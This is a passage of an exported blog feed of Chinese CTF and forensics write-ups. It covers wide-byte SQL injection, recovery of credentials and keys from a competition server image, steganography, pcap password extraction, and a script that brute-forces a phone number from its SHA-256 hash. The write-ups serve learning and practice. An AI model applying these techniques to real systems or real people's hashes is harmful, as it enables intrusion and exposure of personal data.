保存为utf-8时输出3</p><p>除gbk以外 所有的ANSII编码都是两个字节</p><p><strong>产生原因：</strong>程序员设置数据库编码和php编码为两个不同的编码那就有可能产生宽字节注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514212826314.png" alt="image-20230514212826314"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213445033.png" alt="image-20230514213445033"></p><p>转义函数会将”<strong>‘</strong>“ 单引号 用” \ “进行转义 防止其影响sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213935175.png" alt="image-20230514213935175"></p><p>使用转义函数addslashes后 将admin后面的单引号转义了 不会对执行sql语句产生影响 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514214233897.png" alt="image-20230514214233897"></p><p>但是在这里汉字字符将转义字符”吃”掉了 所以对sql语句执行产生了影响 发生宽字节注入</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届精武杯wp(服务器部分)</title>
      <link href="/2023/04/28/%E7%AC%AC%E5%85%AD%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AFwp(%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86)/"/>
      <url>/2023/04/28/%E7%AC%AC%E5%85%AD%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AFwp(%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86)/</url>
      
        <content type="html"><![CDATA[<h1 id="第六届精武杯wp-服务器部分"><a href="#第六届精武杯wp-服务器部分" class="headerlink" title="第六届精武杯wp(服务器部分)"></a>第六届精武杯wp(服务器部分)</h1><h2 id="5-检材二的操作系统版本是-amp-amp-6-操作系统内核版本"><a href="#5-检材二的操作系统版本是-amp-amp-6-操作系统内核版本" class="headerlink" title="5.检材二的操作系统版本是&amp;&amp;6.操作系统内核版本"></a>5.检材二的操作系统版本是&amp;&amp;6.操作系统内核版本</h2><p><strong>操作系统版本：7.6.1810 (Core)</strong></p><p><strong>内核版本：3.10.0-957.el7.x86_64</strong></p><p><strong>两种方法</strong></p><p><strong>方法一</strong></p><p>直接火眼取证</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427082946897.png" alt="image-20230427082946897"></p><p><strong>方法二</strong></p><p>命令行查找</p><p>操作系统版本</p><pre><code>lsb_release -a //注意需要安装yum install redhat-lsb -ycat /etc/redhat-release</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427084502732.png" alt="image-20230427084502732"></p><p>内核版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427083120457.png" alt="image-20230427083120457"></p><pre><code>cat /proc/versionuname -auname -r</code></pre><h2 id="7-该服务器原始的开机密码是多少"><a href="#7-该服务器原始的开机密码是多少" class="headerlink" title="7.该服务器原始的开机密码是多少"></a>7.该服务器原始的开机密码是多少</h2><p><strong>hl@7001</strong></p><p>尝试用盘古石和火眼绕过识别密码 但是盘古石仿真不起来 火眼直接重置密码</p><p>后来做计算机的同学说计算机里面有一个vc加密文件 挂载后在txt文件中找到服务器密码</p><p>现在在复现一下当时的做题思路</p><p>在取证大师中看到<strong>我的服务器.txt</strong>疑似tc加密文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427100749817.png" alt="image-20230427100749817"></p><p>仿真起计算机 在桌面看到<strong>切勿修改.txt</strong>的文件 打开内容是”key” ——在E盘找到大小为5GB的<strong>我的服务器.txt</strong>  这个大小是一个非常整的数——想到取证大师里面识别出<strong>我的服务器.txt</strong>文件疑似tc加密容器文件——但其实这里是vc加密 用<strong>切勿修改.txt</strong>作为密钥文件挂载<strong>我的服务器.txt</strong>——在<strong>服务器.txt</strong>里面看到网站服务器密码为<strong>hl@7001</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/vmware_XdTwShB9f9.png" alt="vmware_XdTwShB9f9"></p><h2 id="8-该服务器中，6月25日最后一次登陆服务器的ip地址为"><a href="#8-该服务器中，6月25日最后一次登陆服务器的ip地址为" class="headerlink" title="8.该服务器中，6月25日最后一次登陆服务器的ip地址为"></a>8.该服务器中，6月25日最后一次登陆服务器的ip地址为</h2><p><strong>192.168.110.146</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092039298.png" alt="image-20230427092039298"></p><p>宝塔面板——面板日志——看到6.25最后一次登陆成功的ip地址是192.168.110.146</p><p><strong>方法二</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092242614.png" alt="image-20230427092242614"></p><p><strong>last</strong>命令查看登陆记录 看到6.25最后一次登陆成功的ip地址是192.168.110.146</p><h2 id="9-宝塔面板登陆用户名-amp-amp-10-宝塔面板占用端口"><a href="#9-宝塔面板登陆用户名-amp-amp-10-宝塔面板占用端口" class="headerlink" title="9.宝塔面板登陆用户名&amp;&amp;10.宝塔面板占用端口"></a>9.宝塔面板登陆用户名&amp;&amp;10.宝塔面板占用端口</h2><p><strong>用户名：smrzz7he  占用端口：8888</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092810906.png" alt="image-20230427092810906"></p><p><strong>方法二</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092846733.png" alt="image-20230427092846733"></p><h2 id="11-宝塔面板所绑定的手机号码为"><a href="#11-宝塔面板所绑定的手机号码为" class="headerlink" title="11.宝塔面板所绑定的手机号码为"></a>11.宝塔面板所绑定的手机号码为</h2><p><strong>18616963470</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427093011249.png" alt="image-20230427093011249"></p><p><strong>方法二</strong></p><pre><code>cat /www/server/panel/data/userInfo.json</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/Xshell_wWa3Vr14C2.png" alt="Xshell_wWa3Vr14C2"></p><h2 id="12-嫌疑人第一次登陆宝塔的时间为"><a href="#12-嫌疑人第一次登陆宝塔的时间为" class="headerlink" title="12.嫌疑人第一次登陆宝塔的时间为"></a>12.嫌疑人第一次登陆宝塔的时间为</h2><p><strong>2022-06-08 11:04:14</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427101152332.png" alt="image-20230427101152332"></p><h2 id="13-宝塔面板平台对于账号的密码采用加盐加密-该salt值为"><a href="#13-宝塔面板平台对于账号的密码采用加盐加密-该salt值为" class="headerlink" title="13.宝塔面板平台对于账号的密码采用加盐加密 该salt值为"></a>13.宝塔面板平台对于账号的密码采用加盐加密 该salt值为</h2><p><strong>6txctAtfAXeI</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427101351813.png" alt="image-20230427101351813"></p><h2 id="14-在宝塔面板账号的密码加密处理过程中-后台一共计算几次MD5值"><a href="#14-在宝塔面板账号的密码加密处理过程中-后台一共计算几次MD5值" class="headerlink" title="14.在宝塔面板账号的密码加密处理过程中 后台一共计算几次MD5值"></a>14.在宝塔面板账号的密码加密处理过程中 后台一共计算几次MD5值</h2><p><strong>3</strong></p><p>宝塔的文件存放在<font color="red"><strong>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;bt</strong></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427205705240.png" alt="image-20230427205705240"></p><p>看到了是调用了 panel_path下的tools.py</p><p>前面也提到了 这个panel_path的路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427210603157.png" alt="image-20230427210603157"></p><p>一般来讲 宝塔的账号密码就放在<font color="red"><strong>&#x2F;www&#x2F;server&#x2F;panel</strong></font>下的<strong>tools.py</strong>下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427210719201.png" alt="image-20230427210719201"></p><p>发现调用了public下的password_salt函数  且计算了一次MD5值</p><p>转到public.py  他在&#x2F;www&#x2F;server&#x2F;panel&#x2F;class下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427211057195.png" alt="image-20230427211057195"></p><p>这里又算了两次MD5  所以一共是三次</p><h2 id="15-请分析目标服务器中网站管理员登录的入口地址为"><a href="#15-请分析目标服务器中网站管理员登录的入口地址为" class="headerlink" title="15.请分析目标服务器中网站管理员登录的入口地址为"></a>15.请分析目标服务器中网站管理员登录的入口地址为</h2><p><strong>&#x2F;admin</strong></p><p>按照16题图 进入网站运行目录</p><p>运行目录下管理员入口地址就是&#x2F;admin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427110103406.png" alt="image-20230427110103406"></p><h2 id="16-目标服务器中网站的网站运行目录为"><a href="#16-目标服务器中网站的网站运行目录为" class="headerlink" title="16.目标服务器中网站的网站运行目录为"></a>16.目标服务器中网站的网站运行目录为</h2><p><strong>&#x2F;public</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427105722400.png" alt="image-20230427105722400"></p><h2 id="17-请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为："><a href="#17-请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为：" class="headerlink" title="17.请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为："></a>17.请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为：</h2><p><strong>2364</strong></p><p>后台的账号密码等数据在网站数据库中 用宝塔自带的phpadmin可以登陆数据库 </p><p>在此处进入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427110318474.png" alt="image-20230427110318474"></p><p>可以看到管理员登陆的账号密码是admin admin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111209254.png" alt="image-20230427111209254"></p><p>而网站是嫌疑人刘某的  那么账户admin就是刘某</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111232645.png" alt="image-20230427111232645"></p><h2 id="18-在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少"><a href="#18-在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少" class="headerlink" title="18.在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少"></a>18.在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少</h2><p><strong>1</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111808792.png" alt="image-20230427111808792"></p><p>在这个目录下的99999.php、head.php等文件中 都能看出 购买会员需要支付1RMB</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111928652.png" alt="image-20230427111928652"></p><h2 id="19-请分析目标服务器中网站代理登录的入口地址为"><a href="#19-请分析目标服务器中网站代理登录的入口地址为" class="headerlink" title="19.请分析目标服务器中网站代理登录的入口地址为"></a>19.请分析目标服务器中网站代理登录的入口地址为</h2><p><strong>&#x2F;user</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112051535.png" alt="image-20230427112051535"></p><h2 id="20-该网站后台所使用的数据库版本号为："><a href="#20-该网站后台所使用的数据库版本号为：" class="headerlink" title="20.该网站后台所使用的数据库版本号为："></a>20.该网站后台所使用的数据库版本号为：</h2><p><strong>5.6.50</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112334252.png" alt="image-20230427112334252"></p><h2 id="21-该网站所使用的数据库的库名（database名）为"><a href="#21-该网站所使用的数据库的库名（database名）为" class="headerlink" title="21. 该网站所使用的数据库的库名（database名）为"></a>21. 该网站所使用的数据库的库名（database名）为</h2><p><strong>sr2</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112422442.png" alt="image-20230427112422442"></p><h2 id="22-该网站所使用的数据库的root密码为"><a href="#22-该网站所使用的数据库的root密码为" class="headerlink" title="22.该网站所使用的数据库的root密码为"></a>22.该网站所使用的数据库的root密码为</h2><p><strong>ee09f228483aaf60</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112504573.png" alt="image-20230427112504573"></p><h2 id="23-该网站代码中，记录数据库账号密码的配置文件名为"><a href="#23-该网站代码中，记录数据库账号密码的配置文件名为" class="headerlink" title="23.该网站代码中，记录数据库账号密码的配置文件名为"></a>23.该网站代码中，记录数据库账号密码的配置文件名为</h2><p><strong>database.php</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114028978.png" alt="image-20230427114028978"></p><h2 id="24-请分析该网站后台的管理员登陆密码为"><a href="#24-请分析该网站后台的管理员登陆密码为" class="headerlink" title="24. 请分析该网站后台的管理员登陆密码为"></a>24. 请分析该网站后台的管理员登陆密码为</h2><p><strong>admin</strong></p><p>同17题</p><h2 id="25-请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）"><a href="#25-请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）" class="headerlink" title="25. 请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）"></a>25. 请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）</h2><p><strong>4个</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114159269.png" alt="image-20230427114159269"></p><h2 id="26-请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为"><a href="#26-请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为" class="headerlink" title="26.请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为"></a>26.请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为</h2><p><strong>cc88afc0114805b4819e01c9e1f1f98e</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230428082807996.png" alt="image-20230428082807996"></p><h2 id="27-请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为"><a href="#27-请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为" class="headerlink" title="27.请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为"></a>27.请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为</h2><p><strong>password_hash</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114712934.png" alt="image-20230427114712934"></p><p><strong>最后在梳理一下做题的流程 ——首先是火眼分析一波(注意有linux服务器的一定要在自动分析后在点快速分析一次 不然看不到结果) ——然后仿真起 盘古石能仿真的话最好别重置密码 看一下原始密码 仿真不了用火眼会自动重置密码 原始密码可以后续检材找 ——看一下本地ip和虚拟机ip是否在同一局域网下 不在就手动修改 ——xshell远程连接——有宝塔面板的就重置宝塔密码 起宝塔——自此 大部分信息都可以从火眼分析和宝塔面板里面看到了 包括网站源文件 数据库等等</strong></p><p>所幸此次取证服务器没涉及到网站重构 不然就又要坐大牢了 还是要学习一下这个方面的东西啊  任重道远…….</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>社团春季赛miscwp</title>
      <link href="/2023/04/16/%E7%A4%BE%E5%9B%A2%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
      <url>/2023/04/16/%E7%A4%BE%E5%9B%A2%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="社团春季赛wp-Misc"><a href="#社团春季赛wp-Misc" class="headerlink" title="社团春季赛wp(Misc)"></a>社团春季赛wp(Misc)</h1><h2 id="April-misc1-ez-vera"><a href="#April-misc1-ez-vera" class="headerlink" title="April_misc1_ez_vera"></a>April_misc1_ez_vera</h2><p>给了一个压缩包  但是不能爆破出密码(别问我是怎么知道的QAQ)放入winhex里面找一下 是伪加密</p><p>改完后有一个需要挂载的vc容器 一个key.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204403661.png" alt="image-20230416204403661"></p><p>加密密钥就是key.jpg  得到一段密文</p><pre><code>cppjrbvxlbvloou!kesg ls ujh fmcj : fmcj&#123;379ccg45-hcb0-21g3-0d69-5bf509e3idbe&#125; vong zosfv ticw d3g4w1w tp espv ewfftv: hprh ypw fao mheq irioi,jeu uwrppjes cqd ogyes ilvf ws.</code></pre><p>观察发现标点符号没有变化(比如大括号和感叹号) 所以可以判断不是移位密码 所以可能是凯撒密码或者维吉尼亚密码 因为没有密码 所以可以用一个可以爆破的维吉尼亚解密网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204509614.png" alt="image-20230416204509614"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204556662.png" alt="image-20230416204556662"></p><pre><code>https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</code></pre><p>:horse:flag{379cbe45-eca0-21e3-0a69-5be509c3fdac}</p><h2 id="April-misc2-滑稽滑稽滑稽-lsb隐写"><a href="#April-misc2-滑稽滑稽滑稽-lsb隐写" class="headerlink" title="April_misc2_滑稽滑稽滑稽(lsb隐写)"></a>April_misc2_滑稽滑稽滑稽(lsb隐写)</h2><p>将windows 7 x64.vmdk镜像仿真出来 看到桌面上有一张图片 回收站里面有东西 恢复是hint.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415155448295.png" alt="image-20230415155448295"></p><p>提示的很明显了  lsb隐写</p><p>将照片提出来 stegsolve中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160737423.png" alt="image-20230415160737423"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160824917.png" alt="image-20230415160824917"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160835126.png" alt="image-20230415160835126"></p><p>可以看出在red blue green的0通道处都有隐写 于是data  extract拿到flag</p><p>:horse:flag{a3f02651-f720-3730-d9bd-7caeda826105}</p><h2 id="April-misc3-winhex-流量分析-过滤http数据-网站登陆方式post"><a href="#April-misc3-winhex-流量分析-过滤http数据-网站登陆方式post" class="headerlink" title="April_misc3_winhex(流量分析 过滤http数据 网站登陆方式post)"></a>April_misc3_winhex(流量分析 过滤http数据 网站登陆方式post)</h2><p>给的winhex.vhd映像是可以装载的 装载后 在一个盘符中可以找到一个流量包 simple.pcap 放入wireshark分析</p><p>题目描述：JD网站被黑客挂马，请找出黑客登录系统使用的密码是_____________，得到的flag</p><p>对于网站登陆账户密码的流量包 首先过滤http数据流 一般账户和密码的提交方式都是post方式 所以过滤语句写成：http.request.method&#x3D;&#x3D;POST</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415161946113.png" alt="image-20230415161946113"></p><p>第一个流量包就是POST&#x2F;index.php？m&#x3D;Home&amp;c&#x3D;Members&amp;a&#x3D;login HTTP&#x2F;1.1  </p><p>login就是登陆页面 追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415191133856.png" alt="image-20230415191133856"></p><p>或者直接在下面就可以看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415191302323.png" alt="image-20230415191302323"></p><p>得到:horse:flag{Admin123!@<strong>#</strong>}</p><h2 id="April-misc4-超大的gif-gif分帧"><a href="#April-misc4-超大的gif-gif分帧" class="headerlink" title="April_misc4_超大的gif(gif分帧)"></a>April_misc4_超大的gif(gif分帧)</h2><p>耐心的看一会儿gif </p><p>到870x左右的时候闪过一张二维码 使用分帧工具 成功分出有二维码的帧</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415192013620.png" alt="image-20230415192013620"></p><p>扫二维码得到:horse:flag{The_G1F_ls_T00_b1g}</p><h2 id="April-misc6-进击的misc-lsb隐写-base91-hex加密"><a href="#April-misc6-进击的misc-lsb隐写-base91-hex加密" class="headerlink" title="April_misc6_进击的misc(lsb隐写 base91 hex加密)"></a>April_misc6_进击的misc(lsb隐写 base91 hex加密)</h2><p>首先 从压缩包里面解压出一个音频文件：是一首叫恶魔之子的歌 了解的人应该知道这是进击的巨人第四季ED</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324090709290.png" alt="image-20230324090709290"></p><p>听起来没什么问题 让我们放到audacuty中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324093408794.png" alt="image-20230324093408794"></p><p>不行 放到010editor中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324093530476.png" alt="image-20230324093530476"></p><p>搜索发现音频后面有一张png图片</p><p>提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/allen.png" alt="allen"></p><p>看到给了一个密钥 Key:Attack_on_Titan</p><p>然后需要我们找到密文 尝试在kali中使用binwalk zsteg foremost等方法没有用</p><p>考虑lsb隐写 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094513240.png" alt="image-20230324094513240"></p><p>得到一个flag.txt放到winhex中发现其实是一个压缩包 更改后缀名 发现一个加密的91+hex.txt的文件 试将刚才得到的key输进去 结果正确</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094723821.png" alt="image-20230324094723821"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094746507.png" alt="image-20230324094746507"></p><p>根据文件名提示91+hex 可能是base91和hex加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094837322.png" alt="image-20230324094837322"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094904504.png" alt="image-20230324094904504"></p><pre><code>进击的巨人从2013年开始放送，到现在2023年 已经是十年的时光。当时的播放量一度超过了火影和海贼。这部番也从陪伴了我从高一开始的青春岁月，四年时间说长不长，说短不短。漫画已在前年完结，动漫也将在今年落下尾声。对于最终的结局，褒贬不一，有人说是烂尾，有人说是神作。而我觉得这个开放式结局，就是谏山创老师为这部作品以及众多深深热爱这部作品的友友们最好的礼物。就像一千个人心里有一千个哈姆雷特，每个人的心中都有一个自己觉得完美的结局，而开放式结局，为大家留下的想象的空间，将让这部作品即使完结已久，再次聊起仍会津津乐道。十年时间，为自由献出的每一颗心脏都值得我们纪念。在这里，让我们最后一次身披自由之翼，喊出那句：flag&#123;xian_shang_xin_zang&#125; !!!!!</code></pre><p>得到:horse:flag{xian_shang_xin_zang} </p><h2 id="April-misc8-只因-winhex隐藏文件-hex逆序"><a href="#April-misc8-只因-winhex隐藏文件-hex逆序" class="headerlink" title="April_misc8_只因(winhex隐藏文件 hex逆序)"></a>April_misc8_只因(winhex隐藏文件 hex逆序)</h2><p>压缩包里面一张图片 放010editor里面 全局搜索 发现两张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323202810964.png" alt="image-20230323202810964"></p><p>还发现一个压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203354856.png" alt="image-20230323203354856"></p><p>全部提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203445527.png" alt="image-20230323203445527"></p><p>其中key.jpg上有一个问题是练习时间是多长，这个大家都知道，是两年半（liangnianban）</p><p>发现压缩包有密码，且不是伪加密</p><p>试将key.jpg中问题的答案作密码填入压缩包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203741997.png" alt="image-20230323203741997"></p><p>得到zhiyin.jpg 但显示图片损坏 看不了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203857653.png" alt="image-20230323203857653"></p><p>最后四位发现是一张完全倒置的图片 写个脚本将其反转</p><pre><code class="python">with open(&#39;zhiyin.jpg&#39;, &#39;rb&#39;) as f:    with open(&#39;flag.jpg&#39;, &#39;wb&#39;) as g:        g.write(f.read()[::-1])</code></pre><p>得到正确图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/zhiyin0.jpg" alt="zhiyin0"></p><p>:horse:flag{do_you_like_zhiyin}</p><h2 id="April-misc9-telephone-number"><a href="#April-misc9-telephone-number" class="headerlink" title="April_misc9_telephone_number"></a>April_misc9_telephone_number</h2><pre><code>手机在AirDrop时传输的手机号哈希值，已知该手机号是170号段首批放号的联通号码，你能找到该手机号吗？(含国家代码)Hash：daa0959c1de27ce05b75d133d8881d0b1ef261c5e615bdd1238d396880bb4223</code></pre><p>脚本原理是根据手机号的哈希值进行爆破  </p><p>从8617000000000到8617100000000</p><pre><code class="python">import hashlibsha256 = &#39;daa0959c1de27ce05b75d133d8881d0b1ef261c5e615bdd1238d396880bb4223&#39;for i in range(8617000000000, 8617100000000):    hash = hashlib.sha256(str(i).encode(&#39;utf-8&#39;)).hexdigest()     # 先进行utf-8加密在转sha256 在转成16进制    if hash == sha256:        print(i)        break# 8617091733719</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/7d3559219edd4629b0d37938362459f0.png" alt="img"></p><p>查阅资料可以知道这种哈希加密算法是sha256</p><p>:horse:flag{8617091733719}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023愚人杯misc wp</title>
      <link href="/2023/04/13/2023%E6%84%9A%E4%BA%BA%E6%9D%AFmiscwp/"/>
      <url>/2023/04/13/2023%E6%84%9A%E4%BA%BA%E6%9D%AFmiscwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023愚人杯部分miscwp"><a href="#2023愚人杯部分miscwp" class="headerlink" title="2023愚人杯部分miscwp"></a>2023愚人杯部分miscwp</h1><h2 id="哇库哇库2"><a href="#哇库哇库2" class="headerlink" title="哇库哇库2"></a>哇库哇库2</h2><p>在给的压缩包的注释中看到解压密码的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090152685.png" alt="image-20230412090152685"></p><p>结果就是自然对数e 保留12位有效数字 密码是2.71828182846</p><p>解压出一张HINT.png和一个docx文档</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090342866.png"></p><p>但是图片是坏的 进行修复</p><p>先用crc脚本看一下分辨率有没有问题</p><pre><code class="python">import binasciiimport structcrc32_hex = 0X72DC3AB7   # 后面添所选图片的crc值 为0xfilename = &#39;HINT.png&#39; # 后面添图片的名字 要将图片和脚本放在同一目录下 保证路径相同crcbp = open(filename, &quot;rb&quot;).read()for i in range(2000):    for j in range(2000):        data = crcbp[12:16] + \            struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + crcbp[24:29]        crc32 = binascii.crc32(data) &amp; 0xffffffff        if(crc32 == crc32_hex):            print(i, j)            print(&#39;wid:&#39;, hex(i))            print(&#39;hight:&#39;, hex(j))</code></pre><pre><code class="python">795 937wid: 0x31bhight: 0x3a9</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090542555.png" alt="image-20230412090542555"></p><p>在看图片头 明明是png文件 文件头却是jpg的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090627015.png" alt="image-20230412090627015"></p><p>同时文件尾也存在问题 对照正确格式的png文件将其文件首尾改正</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090744934.png" alt="image-20230412090744934"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090756900.png" alt="image-20230412090756900"></p><p>打开图片是”智慧的”的阿尼亚和提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090840027.png" alt="image-20230412090840027"></p><p>提示GB 2312就是汉字编码字符集的意思 或许我们应该注意一下文档中的汉字 或者对其进行什么操作</p><p>文档内容是将文档中给出的原视频的字幕提取出来了 对比原视频 好像文档中的字幕多出了。！？这三种标点符号 猜测是Ook编码</p><pre><code class="python">import reimport stringprint(&#39;Start!&#39;)string = 